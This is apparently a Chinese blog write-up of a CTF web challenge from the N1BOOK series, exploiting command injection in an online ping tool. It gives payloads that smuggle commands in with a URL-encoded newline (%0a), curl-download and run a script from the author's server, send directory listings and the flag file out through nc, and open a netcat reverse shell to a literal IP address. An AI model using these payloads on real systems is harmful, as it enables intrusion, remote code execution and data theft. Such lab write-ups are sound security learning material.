---
title: 从0到1：CTFer成长之路 N1BOOK of web 死亡ping命令 writeup
date: 2022-04-12 11:20:00
updated: 2022-04-13 11:56:00
tags: [ctf,security,<<从0到1：CTFer成长之路>]
description: <<从0到1：CTFer成长之路>>配套题目 web相关题目的做题记录 N1BOOK of web 死亡ping命令 writeupcahttps://blog.csdn.net/qq_45414878/article/details/109672659
---

是一个提供了ping命令的在线网站

![image-20220412112049704](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412112049704.png)

ping是一个在shell中执行的命令，假如我们可以传入恶意用户输入，可以在shell中执行任意命令的话，想要读个flag文件显然不难。

我先是使用了自己的命令行做了一下测试，测试中也遇到不少奇怪的问题，但是发现个可以利用的点

我这里用&把前面的命令挂起，就可以执行后面的命令

![image-20220412114037460](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412114037460.png)

不过试了试发现题目把&过滤了

![image-20220412114122744](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412114122744.png)

那看来需要fuzz一下看看过滤了什么，然后再想想能用什么了，我用burpsuite抓包然后来进行fuzz测试

找了好久也没找到什么burpsuite可以用来fuzz单个字符的方法，但是我看别人的wp都能用burpsuite来fuzz单个字符，好奇怪，只能先不管了。

总之参考别人的wp，这里绕过过滤执行shell命令的方法是用%0a，也就是url编码的换行符来执行shell命令，由于docker是没有bash、python程序的，官方wp中提到sh反弹是不行的，那这里只能用curl先获取写在我自己服务器上的.sh文件，将想要执行的恶意代码放进.sh文件中，在题目环境中先用curl获取这个.sh文件并放进tmp目录下，再执行.sh文件，命令执行的结果输出到我服务器监听的端口上，下面是payload，在服务器上放一个evil.sh文件，并且在文件中先后写入`ls -la /| nc ip`看到ls的结果后）知道flag文件名字是FLAG，将evil.sh的内容改成`cat /FLAG | nc ip`，再执行一遍即可。

先让evil.sh的内容为`ls -la / | nc ip port`，

payload:`ip=127.0.0.1%0acurl ip:port/evil.sh /tmp/evil.sh` 将放在我服务器上的evil.sh下载到靶机的tmp目录下

payload:`ip=127.0.0.1%0achmod777 /tmp/evil.sh`用chmod命令给文件执行权限（实际上不用chmod给权限也可以执行）

`nc -nvlp 8089`在我服务器上开启端口监听，这样后面执行evil.sh后可以把结果发到我服务器上

payload:`ip=127.0.0.1%0ash /tmp/evil.sh` 用sh命令执行evil.sh，执行evil.sh中的恶意代码

需要注意一下`ls -la /`这个命令，如果不加/，那么直接ls会在root目录下执行，FLAG放在根目录下，这样你会发现没有flag文件，加了/后发现FLAG文件就在根目录下

![image-20220412225240205](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412225240205.png)

那接下来就修改一下evil.sh 里面内容为`cat /FLAG | nc ip port`就可以

payload:`ip=127.0.0.1%0acurl ip:port/evil.sh /tmp/evil.sh` 将放在我服务器上的evil.sh下载到靶机的tmp目录下

payload:`ip=127.0.0.1%0achmod777 /tmp/evil.sh`用chmod命令给文件执行权限（实际上不用chmod给权限也可以执行）

`nc -nvlp 8089`在我服务器上开启端口监听，这样后面执行evil.sh后可以把结果发到我服务器上

payload:`ip=127.0.0.1%0ash /tmp/evil.sh` 用sh命令执行evil.sh，执行evil.sh中的恶意代码

![image-20220412224057283](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412224057283.png)

拿到flag啦，但是拿到flag后我又很奇怪其中的一些步骤为什么反弹shell不行，因为这里是有nc的，所以我就尝试用nc反弹shell了

在evil.sh中写入`nc ip port -e /bin/sh`，然后还是和上面一样用`ip=127.0.0.1%0acurl ip:port/evil.sh /tmp/evil.sh`把文件读到/tmp目录下并且用`ip=127.0.0.1%0ash /tmp/evil.sh`执行evil.sh，发现可以成功弹shell...可能是BUU的环境不太对劲？这就不清楚了。

![image-20220413114849678](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220413114849678.png)

那既然把命令写在文件里面执行可以的话，感觉也可以直接弹shell吧，用payload:`ip=127.0.0.1%0anc 39.108.253.105 8089 -e /bin/sh`试了试发现有被过滤的字符，这么一想确实把命令写在文件里面用curl下载再执行的方式可以绕过一些过滤，题目的环境和官方wp有些不太对的上，也不懂为啥官方wp说不能弹shell，有点迷惑，就这样吧这个题。



